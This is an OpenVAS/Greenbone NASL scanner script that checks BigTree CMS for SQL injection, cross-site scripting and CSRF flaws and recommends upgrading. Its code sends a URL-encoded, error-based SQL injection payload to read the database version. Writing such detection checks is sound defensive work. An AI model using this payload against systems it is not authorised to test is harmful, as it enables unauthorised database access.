# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:bigtreecms:bigtree_cms";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803869");
  script_version("2023-07-27T05:05:08+0000");
  script_cve_id("CVE-2013-4879", "CVE-2013-4880", "CVE-2013-5313", "CVE-2013-4881");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-07-27 05:05:08 +0000 (Thu, 27 Jul 2023)");
  script_tag(name:"creation_date", value:"2013-08-19 12:51:13 +0530 (Mon, 19 Aug 2013)");
  script_name("BigTree CMS Multiple Vulnerabilities");

  script_tag(name:"summary", value:"BigTree CMS is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check whether it is able to read the
  database version or not.");

  script_tag(name:"solution", value:"Update to version 4.0 or later.");

  script_tag(name:"insight", value:"Multiple flaws are due to:

  - Improper sanitation of user-supplied input passed via the
  URL to the site/index.php script and 'module' parameter upon submission
  to '/admin/developer/modules/views/add/index.php' script

  - Cross-site request forgery (CSRF) vulnerability in
  core/admin/modules/users/create.php and core/admin/modules/users/update.php");

  script_tag(name:"affected", value:"BigTree CMS version 4.0 RC2 and prior.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert arbitrary HTML
  or script code, which will be executed in a user's browser session in the
  context of an affected site, hijack user session or manipulate SQL queries
  by injecting arbitrary SQL code.");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/86287");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/61699");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/61701");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/61702");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/61839");
  script_xref(name:"URL", value:"https://www.htbridge.com/advisory/HTB23165");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_bigtree_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("bigtree_cms/detected");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(port:port, cpe:CPE))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/site/index.php/%27and%28select%201%20from%28select%20"+
            "count%28*%29%2cconcat%28%28select%20concat%28version%2"+
            "8%29%29%29%2cfloor%28rand%280%29*2%29%29x%20from%20inf"+
            "ormation_schema.tables%20group%20by%20x%29a%29and%27";

if(http_vuln_check(port:port, url:url, check_header:TRUE,
   pattern:"<b>Fatal error</b>:  Uncaught exception.*invalid sqlquery\(\).*Duplicate entry .([0-9.]+)")) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
